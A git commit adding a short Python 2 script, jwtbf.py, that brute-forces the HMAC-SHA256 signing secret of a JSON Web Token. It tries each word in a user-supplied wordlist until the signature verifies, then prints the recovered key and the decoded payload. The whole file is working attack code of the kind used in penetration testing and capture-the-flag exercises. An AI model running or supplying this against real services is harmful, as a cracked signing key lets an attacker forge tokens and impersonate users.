87462194f20d497cfa538790737edcd101cec456
root <root@debian-lab>
2016-11-14 10:29:38 -0500

    first version

---
+++ jwtbf.py
@@ -0,0 +1,28 @@
+# jwtbf.py - simple script to brute force JWT token signature using a wordlist
+# For JWT info, refer to https://jwt.io/introduction/
+# This script requires PyJWT Package https://pypi.python.org/pypi/PyJWT
+# For usage, supplies when asked JWT token then the target wordlist
+# ismaelrocha.projetos@gmail.com
+
+import jwt;
+
+token = raw_input("Enter JWT token:")
+files = raw_input("Enter wordlist name:")
+
+# change this to True to verify token expiration
+options = { 'verify_exp':False}
+
+with open(files) as seckeys:
+	for secret in seckeys:
+		try:
+			# change algorithm='HS256' to another supported algorithm if necessary 
+			# refer to https://pypi.python.org/pypi/PyJWT/1.0.1 for algorithm support
+			payload = jwt.decode(token, secret.rstrip(), algorithm='HS256', options=options)
+			print "Success. Token decoded with the following key:" + secret.rstrip()
+			print payload
+			break
+		except jwt.InvalidTokenError:
+			print "Failed to verify token signature with the following key: "  + secret.rstrip()
+		except jwt.ExpiredSignatureError:
+			print "Token is Expired"
+	
